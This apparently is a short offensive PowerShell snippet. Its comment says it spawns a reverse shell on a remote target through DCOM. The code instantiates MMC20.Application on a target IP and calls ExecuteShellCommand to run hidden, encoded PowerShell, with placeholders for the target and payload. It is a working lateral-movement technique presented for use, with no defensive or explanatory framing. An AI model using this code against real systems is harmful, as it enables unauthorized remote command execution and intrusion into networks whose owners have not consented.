# This script will try to use DCOM system to spawn a process (in our case a reverse shell) in a remote target.

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<targetIP>"));$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -enc <encodedpayload>","7")
